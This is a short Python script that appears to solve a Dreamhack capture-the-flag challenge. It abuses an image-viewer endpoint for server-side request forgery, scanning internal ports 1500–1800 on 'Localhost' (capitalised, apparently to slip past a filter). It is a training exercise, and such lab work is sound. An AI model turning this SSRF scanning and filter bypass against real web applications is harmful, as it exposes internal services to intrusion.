import requests
import sys
from tqdm import tqdm

NOTFOUND_IMG = 'iVBORw0KG'

def send_img(img_url):
    global chall_url

    data = {
        'url': img_url
    }

    response = requests.post(chall_url, data=data)

    return response.text

def find_port():
    for port in tqdm(range(1500, 1801)):
        img_url = f"http://Localhost:{port}"

        if NOTFOUND_IMG not in send_img(img_url):
            print(f'port: {port}')
            break

    return port

if __name__ == '__main__':
    chall_port = int(sys.argv[1])
    chall_url = f'http://host1.dreamhack.games:{chall_port}/img_viewer'

    internal_port = find_port()